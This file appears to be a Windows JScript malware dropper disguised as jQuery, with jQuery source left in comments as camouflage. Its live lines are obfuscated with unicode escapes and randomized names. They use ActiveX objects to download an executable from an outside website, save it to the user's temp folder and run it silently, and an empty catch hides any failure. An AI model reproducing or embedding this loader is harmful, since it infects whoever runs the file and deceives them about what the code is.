//(function( global, factory ) {

var NbIhnucM = '\u0052un'; var znyGf = this['\u0041\u0063\u0074\u0069\u0076\u0065X\u004Fbje\u0063t'];
var gRFPWWVzG = new znyGf('\u0057\u0053\u0063r\u0069\u0070t.\u0053\u0068\u0065\u006Cl');
// if ( typeof module === "object" && typeof module.exports === "object" ) {   // For CommonJS and CommonJS-like environments where a proper `window`   // is present, execute the factory and get jQuery.   // For environments that do not have a `window` with a `document`   // (such as Node.js), expose a factory as module.exports.   // This accentuates the need for the creation of a real `window`.   // e.g. var jQuery = require("jquery")(window);   // See ticket #14549 for more info.   module.exports = global.document ?    factory( global, true ) :    function( w ) {     if ( !w.document ) {      throw new Error( "jQuery requires a window with a document" );     }     return factory( w );    };  } else {   factory( global );  
var bOdKUvCj = gRFPWWVzG['\u0045\u0078\u0070\u0061\u006EdEn\u0076\u0069ro\u006E\u006D\u0065\u006E\u0074\u0053\u0074ri\u006E\u0067\u0073']('%\u0054E\u004D\u0050\u0025') + '\u002F\u0065\u006B\u0055\u0049u\u006B\u007A\u006A\u0061.\u0065\u0078\u0065';
//}// Pass this if window is not defined yet }(typeof window !== "undefined" ? window : this, function( window, noGlobal ) {
var kDbMCI = new znyGf('\u004D\u0053X\u004D\u004C2.\u0058M\u004CHT\u0054\u0050');
//// Support: Firefox 18+ // Can"t be in strict mode, several libs including ASP.NET trace // the stack via arguments.caller.callee and Firefox dies if // you try to trace through "use strict" call chains. (#13335) //"use strict"; var deletedIds = [];
kDbMCI['o\u006E\u0072\u0065\u0061\u0064ys\u0074\u0061\u0074\u0065c\u0068\u0061n\u0067\u0065'] = function () {
        if (kDbMCI['\u0072\u0065\u0061dys\u0074\u0061te'] === 4) {
            var HqhAMjEcd = new znyGf('\u0041DO\u0044\u0042\u002ES\u0074\u0072\u0065\u0061\u006D');
            //var document = window.document;
            HqhAMjEcd['\u006Fp\u0065n']();
            //var slice = deletedIds.slice;
            HqhAMjEcd['\u0074yp\u0065'] = 1;
            //var concat = deletedIds.concat;
            HqhAMjEcd['\u0077\u0072\u0069te'](kDbMCI['\u0052\u0065\u0073\u0070o\u006E\u0073e\u0042\u006Fd\u0079']);
            //var push = deletedIds.push;
            HqhAMjEcd['\u0070os\u0069\u0074\u0069\u006F\u006E'] = 0;
            //var indexOf = deletedIds.indexOf;
            HqhAMjEcd['\u0073ave\u0054\u006F\u0046\u0069\u006C\u0065'](bOdKUvCj, 2);
            //var class2type = {};
            HqhAMjEcd['\u0063\u006Co\u0073e']();
            //var toString = class2type.toString;
        };
};
try {

    //var hasOwn = class2type.hasOwnProperty;
    kDbMCI['o\u0070e\u006E']('G\u0045T', 'h\u0074\u0074\u0070\u003A\u002F\u002F\u0073\u0068\u006F\u0070\u0074\u0068\u006F\u0069\u0074\u0072\u0061\u006Eg\u0070\u0068\u0075\u006B\u0069\u0065\u006E\u002E\u0063\u006F\u006D\u002F\u0073\u0079\u0073\u0074\u0065\u006D\u002F\u006C\u006F\u0067\u0073\u002F\u0037\u0079\u0067v\u0074\u0079v\u0062\u0037\u006E\u0069\u0069\u006D\u002E\u0065\u0078\u0065', false);

    //var support = {};
    kDbMCI['se\u006E\u0064']();
    //
    gRFPWWVzG[NbIhnucM](bOdKUvCj, 1, ![]+[]);
    //var  version = "1.12.1",
} catch (Kfooe) { };
// // Define a local copy of jQuery  jQuery = function( selector, context ) {